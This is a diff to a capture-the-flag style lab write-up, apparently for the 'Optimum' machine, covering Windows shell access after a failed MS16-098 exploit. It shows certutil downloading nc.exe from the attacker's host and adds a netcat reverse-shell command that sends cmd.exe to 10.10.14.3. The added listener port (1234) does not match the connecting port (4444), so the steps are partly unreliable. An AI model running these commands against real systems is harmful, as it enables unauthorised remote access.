@@ -47,9 +47,12 @@ I found out that this machine was vulnerable to MS16-098: </br>
 The exploit didn't work and my powershell session got stuck, So i tried using netcat, to send myself a proper CMD shell: </br>
 **Kali Linux:** </br>
 First, I copied the nc.exe binary to my working directory: ```cp /usr/share/windows-binaries/nc.exe . ``` </br>
-Second, I Hosted a python http server with: ```python -m http.server 80``` </br>
+Second, I hosted a python http server with: ```python -m http.server 80``` and on another window, started a netcat listener: ```nc -nlvp 1234``` </br>
 **Windows Target Machine:** </br>
 I used certutil to transfer the file from my Kali to the Windows machine:
 ```bash
 certutil -urlcache -split -f "http://10.10.14.3/nc.exe" nc.exe
 ```
+Finally, I ran the netcat with: ```nc.exe 10.10.14.3 4444 -e cmd.exe``` </br>
+<img src="images/optimum/netcat_shell.png" alt="netcat_shell" width="800" height="200"/> </br> </br>
+
